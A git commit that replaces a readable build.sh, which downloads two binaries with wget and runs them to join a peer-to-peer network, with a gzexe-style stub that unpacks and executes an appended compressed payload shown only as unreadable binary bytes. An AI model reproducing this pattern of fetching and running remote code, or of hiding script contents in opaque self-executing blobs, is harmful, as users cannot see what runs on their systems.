3ec162ad05739b4d898cb3c3bb9be99a1dc3c6a2
Dr. Z <o_u1000@dragons.hutchcc.edu>
2019-11-29 23:53:59 +0800

    Update build.sh

--- build.sh
+++ build.sh
@@ -1,20 +1,47 @@
-apt-get install subversion build-essential libssl-dev autoconf -y
+#!/bin/sh
+skip=44
 
-wget https://github.com/4D4937/Others/raw/master/N1
-wget https://github.com/4D4937/Others/raw/master/N2
-clear
+tab='	'
+nl='
+'
+IFS=" $tab$nl"
 
-echo #############################
-echo #                           #
-echo #LIBER+ Pnetwork Bulid Shell#
-echo #                           #
-echo #############################
+umask=`umask`
+umask 77
 
-read -p "网络名称:" network_name
-read -p "中心节点ip:" cnode_ip
-read -p "端口:" port
-read -p "内网分配ip:" enode_ip
-read -p "密钥:" network_pass
+gztmpdir=
+trap 'res=$?
+  test -n "$gztmpdir" && rm -fr "$gztmpdir"
+  (exit $res); exit $res
+' 0 1 2 3 5 10 13 15
 
-./N2 -a ${enode_address} -c ${network_name} -k ${network_pass} -l ${cnode_address}:${port}
-./N1 -l ${port} -f -v
+if type mktemp >/dev/null 2>&1; then
+  gztmpdir=`mktemp -dt`
+else
+  gztmpdir=/tmp/gztmp$$; mkdir $gztmpdir
+fi || { (exit 127); exit 127; }
+
+gztmp=$gztmpdir/$0
+case $0 in
+-* | */*'
+') mkdir -p "$gztmp" && rm -r "$gztmp";;
+*/*) gztmp=$gztmpdir/`basename "$0"`;;
+esac || { (exit 127); exit 127; }
+
+case `echo X | tail -n +1 2>/dev/null` in
+X) tail_n=-n;;
+*) tail_n=;;
+esac
+if tail $tail_n +$skip <"$0" | gzip -cd > "$gztmp"; then
+  umask $umask
+  chmod 700 "$gztmp"
+  (sleep 5; rm -fr "$gztmpdir") 2>/dev/null &
+  "$gztmp" ${1+"$@"}; res=$?
+else
+  echo >&2 "Cannot decompress $0"
+  (exit 127); res=127
+fi; exit $res
+??醈build.sh K,(袽O-Q(-HI,I濯,蛥1J2髪Ksr驅蚶R赛虃捘詁]7.鋵|e| 狣7€)耨tr
+?
+浈枖?e僥?RsrH0痆笂RSt敒餄鴟鳒?z?違イ ?>/17¤蓭礝?胯jz薮3? ?9/?%5>? 蓽针燊/J??劅兜mx谘霾??C缬鮩/'-E不 备構?鋉[呍旚T軩昷樦Z載 侃@$!?@??胎礦*?д*ī)??? j棱\ 顴俊
+  
